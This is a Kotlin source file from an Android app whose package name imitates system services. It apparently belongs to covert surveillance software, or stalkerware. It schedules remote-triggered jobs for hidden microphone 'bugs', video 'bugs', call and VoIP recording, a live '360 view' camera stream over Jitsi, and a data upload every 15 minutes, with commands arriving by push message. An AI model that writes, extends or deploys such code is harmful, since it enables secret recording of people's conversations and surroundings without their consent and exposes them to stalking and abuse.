package com.android.services.workers

import android.content.Context
import android.os.Build
import androidx.work.*
import com.android.services.enums.FcmPushStatus
import com.android.services.models.MicBugScheduleCommand
import com.android.services.models.VideoBugCommand
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose
import com.android.services.workers.View360ByJitsi.View360ByJitsiCommandProcessingBase
import com.android.services.workers.View360ByJitsi.View360ByJitsiMeetCommandWorker
import com.android.services.workers.callRecord.CallRecordProcessingBase
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.android.services.workers.micbug.MicBugCommandProcessingBase
import com.android.services.workers.micbug.MicBugCommandWorker
import com.android.services.workers.videobug.VideoBugCommandProcessingBase
import com.android.services.workers.videobug.VideoBugCommandWorker
import com.android.services.workers.view360.View360CommandProcessingBase
import com.android.services.workers.view360.View360CommandWorker
import com.android.services.workers.voip.VoipCallRecordProcessingBase
import com.android.services.workers.voip.VoipCallRecordWorkerService
import com.google.gson.Gson
import java.util.*
import java.util.concurrent.TimeUnit


object FutureWorkUtil {

    fun scheduleWork(context: Context, minute: Int) {
        val currentDate = Calendar.getInstance()
        val dueDate = Calendar.getInstance()
        dueDate.set(Calendar.HOUR_OF_DAY, 12)
        dueDate.set(Calendar.HOUR_OF_DAY, 12)
        dueDate.set(Calendar.MINUTE, minute)
        dueDate.set(Calendar.SECOND, 0)
        if (dueDate.before(currentDate)) {
            dueDate.add(Calendar.HOUR_OF_DAY, 24)
        }
        val timeDiff = dueDate.timeInMillis - currentDate.timeInMillis
        val endDate = AppUtils.formatDate(dueDate.timeInMillis.toString())
        logVerbose("work end date = $endDate")

        val futureWorkerBuilder = OneTimeWorkRequestBuilder<FutureWorker>()
            .setInitialDelay(timeDiff, TimeUnit.MILLISECONDS)
            .addTag(endDate)

        val builder = Data.Builder()
        builder.putString(FutureWorker.KEY_MIC_BUG_COMMAND, endDate)
        futureWorkerBuilder.setInputData(builder.build())
//        WorkManager.getInstance(context)
//            .enqueueUniqueWork(
//                endDate,
//                ExistingWorkPolicy.REPLACE,
//                futureWorkerBuilder.build()
//            )
        WorkManager.getInstance(context).enqueue(futureWorkerBuilder.build())
    }

    /** This schedules the Mic Bug to be triggered in future time
     *  [MicBugScheduleCommand] is the Command that contains the scheduling information like Schedule Date etc
     *  [MicBugScheduleCommand.schedule] is the due date at which the micBug has be to scheduled in Future
     *  **/
    fun scheduleMicBug(
        context: Context,
        micBugScheduleCommand: MicBugScheduleCommand
    ): FcmPushStatus {
        val todayDate = AppUtils.getTodayDate(AppConstants.DATE_FORMAT_3)
        logVerbose("${AppConstants.MIC_BUG_TYPE} today date = $todayDate")
        val dueDate = micBugScheduleCommand.schedule
        logVerbose("${AppConstants.MIC_BUG_TYPE} due date = $dueDate")
        AppUtils.appendLog(context, "${AppConstants.MIC_BUG_TYPE} due date = $dueDate")

        if (AppUtils.isDateGreaterThanOther(dueDate, todayDate)) {
            val timeDiff =
                AppUtils.getMilliSecondsBetweenTwoDates(
                    dueDate,
                    todayDate,
                    AppConstants.DATE_FORMAT_3
                )
            logVerbose("${AppConstants.MIC_BUG_TYPE} timeDiff = $timeDiff")
            AppUtils.appendLog(context, "${AppConstants.MIC_BUG_TYPE} timeDiff = $timeDiff")
            
            val futureWorkerBuilder = OneTimeWorkRequestBuilder<FutureWorker>()
                .setInitialDelay(timeDiff, TimeUnit.MILLISECONDS)
                .addTag(dueDate)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val constraints = Constraints.Builder()
                    .setRequiresDeviceIdle(false)
                    .setRequiresCharging(false)
                    .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                    .build()
                futureWorkerBuilder.setConstraints(constraints)
            }

            val builder = Data.Builder()
            val gson = Gson()
            val micBugScheduleCommandString = gson.toJson(micBugScheduleCommand)
            builder.putString(FutureWorker.KEY_MIC_BUG_COMMAND, micBugScheduleCommandString)
            futureWorkerBuilder.setInputData(builder.build())
            WorkManager.getInstance(context).enqueue(futureWorkerBuilder.build())
            return FcmPushStatus.RECEIVED
        } else {
            AppUtils.appendLog(context, "${AppConstants.MIC_BUG_TYPE} Scheduling failed")
            logVerbose("${AppConstants.MIC_BUG_TYPE} Scheduling failed")
            return FcmPushStatus.SCHEDULING_FAILED
        }
    }
    /** This schedules the Mic Bug to be triggered in future time
     *  [VideoBugCommand] is the Command that contains the scheduling information like initial interval etc
     *  [VideoBugCommand.timeOption] is the delay time at which the videobug has be to scheduled in Future
     *  **/
    fun scheduleVideoBug(
        context: Context,
        videoBugCommand: VideoBugCommand
    ): FcmPushStatus {

        try {
            val delayTime = videoBugCommand.timeOption?.toInt() ?: 30
            val timeDiff = if (delayTime == 30) {
                30 * 60 * 1000L
            } else {
                delayTime * 60 * 60 * 1000L
            }
            val futureWorkerBuilder = OneTimeWorkRequestBuilder<VideoBugScheduleWorker>()
                .setInitialDelay(timeDiff, TimeUnit.MILLISECONDS)
                .addTag(System.currentTimeMillis().toString())
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val constraints = Constraints.Builder()
                    .setRequiresDeviceIdle(false)
                    .setRequiresCharging(false)
                    .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                    .build()
                futureWorkerBuilder.setConstraints(constraints)
            }

            val builder = Data.Builder()
            val gson = Gson()
            val videoBugScheduleCommandString = gson.toJson(videoBugCommand)
            builder.putString(
                VideoBugScheduleWorker.KEY_VIDEO_BUG_COMMAND,
                videoBugScheduleCommandString
            )
            futureWorkerBuilder.setInputData(builder.build())
            WorkManager.getInstance(context).enqueue(futureWorkerBuilder.build())
            return FcmPushStatus.RECEIVED
        } catch (e: Exception) {
            return FcmPushStatus.SCHEDULING_FAILED
        }
    }
    fun scheduleDataUploadingWorker(context: Context, quickSync: Boolean = false) {
        val dataUploadingWorker =
            PeriodicWorkRequestBuilder<DataUploadingWorker>(
                15,
                TimeUnit.MINUTES
            ).setBackoffCriteria(BackoffPolicy.LINEAR, 10, TimeUnit.SECONDS).build()
        val workManager = WorkManager.getInstance(context)
        if (quickSync) {
            workManager.enqueueUniquePeriodicWork(
                DataUploadingWorker.TAG_DATA_UPLOADING_WORKER,
                ExistingPeriodicWorkPolicy.REPLACE,
                dataUploadingWorker
            )
        } else {
            workManager.enqueueUniquePeriodicWork(
                DataUploadingWorker.TAG_DATA_UPLOADING_WORKER,
                ExistingPeriodicWorkPolicy.KEEP,
                dataUploadingWorker
            )
        }
    }
    fun startView360ByJitsiWorker(context: Context, view360ByJitsiCommandString:String) {
        val serviceRequest =
            OneTimeWorkRequestBuilder<View360ByJitsiMeetCommandWorker>()
        val dataBuilder = Data.Builder()
        dataBuilder.putString(View360ByJitsiCommandProcessingBase.VIEW_360_BY_Jitsi_PUSH, view360ByJitsiCommandString)
        serviceRequest.setInputData(dataBuilder.build())
        WorkManager.getInstance(context).enqueueUniqueWork(
            View360ByJitsiCommandProcessingBase.VIEW_360_BY_JITSI_WORKER_TAG,
            ExistingWorkPolicy.REPLACE,
            serviceRequest.build()
        )
    }
    fun startDataUploadingWorker(context: Context) {
        val dataUploadingWorker =
            OneTimeWorkRequestBuilder<DataUploadingWorker>().setBackoffCriteria(
                BackoffPolicy.LINEAR,
                10,
                TimeUnit.SECONDS
            ).build()
        logVerbose("DataUploadingWorkerInfo= ", "starting one time uploading worker")
        WorkManager.getInstance(context).enqueue(
            dataUploadingWorker
        )
    }
    fun startMicRecordingWorker(context: Context, micBugCommandString: String) {
        val serviceRequest =
            OneTimeWorkRequestBuilder<MicBugCommandWorker>()
        val dataBuilder = Data.Builder()
        dataBuilder.putString(MicBugCommandProcessingBase.MIC_BUG_PUSH, micBugCommandString)
        serviceRequest.setInputData(dataBuilder.build())
        WorkManager.getInstance(context).enqueueUniqueWork(
            MicBugCommandProcessingBase.MIC_BUG_WORKER_TAG,
            ExistingWorkPolicy.KEEP,
            serviceRequest.build()
        )
    }

    fun startCallRecordingWorker(context: Context, callRecordString: String) {
        val serviceRequest =
            OneTimeWorkRequestBuilder<CallRecordWorkerService>()
        val dataBuilder = Data.Builder()
        dataBuilder.putString(CallRecordProcessingBase.IntentKey.KEY_CALL_RECORD, callRecordString)
        serviceRequest.setInputData(dataBuilder.build())
        WorkManager.getInstance(context).enqueueUniqueWork(
            CallRecordProcessingBase.CALL_RECORDING_WORKER_TAG,
            ExistingWorkPolicy.KEEP,
            serviceRequest.build()
        )
    }

    fun startVoipCallRecordingWorker(context: Context, voipCallRecordString: String) {
        val serviceRequest =
            OneTimeWorkRequestBuilder<VoipCallRecordWorkerService>()
        val dataBuilder = Data.Builder()
        dataBuilder.putString(VoipCallRecordProcessingBase.VOIP_CALL_RECORD, voipCallRecordString)
        serviceRequest.setInputData(dataBuilder.build())
        WorkManager.getInstance(context).enqueueUniqueWork(
            VoipCallRecordProcessingBase.TAG_VOIP_CALL_RECORDING_WORKER,
            ExistingWorkPolicy.KEEP,
            serviceRequest.build()
        )
    }
    fun startVideoBugWorker(context: Context, fcmPushString: String) {
        val serviceRequest =
            OneTimeWorkRequestBuilder<VideoBugCommandWorker>()
        val dataBuilder = Data.Builder()
        dataBuilder.putString(VideoBugCommandProcessingBase.VIDEO_BUG_PUSH, fcmPushString)
        serviceRequest.setInputData(dataBuilder.build())
        WorkManager.getInstance(context).enqueueUniqueWork(
            VideoBugCommandProcessingBase.VIDEO_BUG_WORKER_TAG,
            ExistingWorkPolicy.KEEP,
            serviceRequest.build()
        )
    }

    fun startView360Worker(context: Context) {
        val serviceRequest =
            OneTimeWorkRequestBuilder<View360CommandWorker>()
        WorkManager.getInstance(context).enqueueUniqueWork(
            View360CommandProcessingBase.TAG_360_WORKER,
            ExistingWorkPolicy.REPLACE,
            serviceRequest.build()
        )
    }


    fun cancelDataUploadingWorker(context: Context) {
        WorkManager.getInstance(context)
            .cancelUniqueWork(DataUploadingWorker.TAG_DATA_UPLOADING_WORKER)
        logVerbose("DataUploadingWorkerInfo= ", "Data Uploading worker cancelled")
    }
    fun stopBackgroundWorker(context: Context, tag: String) {
        WorkManager.getInstance(context).cancelUniqueWork(tag)
    }
}